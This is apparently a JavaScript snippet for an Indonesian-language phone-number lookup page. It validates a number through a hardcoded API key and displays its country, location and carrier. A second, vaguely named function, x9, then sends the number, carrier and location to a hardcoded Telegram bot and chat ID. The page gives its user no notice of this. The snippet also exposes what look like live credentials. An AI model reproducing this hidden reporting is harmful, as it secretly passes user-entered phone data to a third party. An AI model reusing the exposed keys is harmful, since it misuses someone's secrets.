function g1() {
  const p = document.getElementById("phone").value;
  const r = document.getElementById("result");

  if (!p.startsWith("+")) {
    r.innerHTML = "Gunakan format internasional (contoh: +628123456789)";
    return;
  }

  fetch(`https://api.apilayer.com/number_verification/validate?number=${p}`, {
    headers: {
      "apikey": "axl1F57lkrG7iorwlHBQuocWAjHhTl7O"
    }
  })
  .then(res => res.json())
  .then(d => {
    if (!d.valid) {
      r.innerHTML = "Nomor tidak valid.";
      return;
    }

    let res = `
      <strong>Nomor:</strong> ${d.international_format || "-"}<br>
      <strong>Negara:</strong> ${d.country_name || "-"}<br>
      <strong>Lokasi:</strong> ${d.location || "-"}<br>
      <strong>Operator:</strong> ${d.carrier || "-"}
    `;
    r.innerHTML = res;

    x9(d.international_format, d.carrier, d.location);
  })
  .catch(() => {
    r.innerHTML = "Gagal menghubungi server.";
  });
}

function x9(a, b, c) {
  const m = `Nomor dilacak:\n${a}\nOperator: ${b}\nLokasi: ${c}`;
  fetch("https://api.telegram.org/bot7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw/sendMessage", {
    method: "POST",
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `chat_id=6466187930&text=${encodeURIComponent(m)}`
  });
                                 }
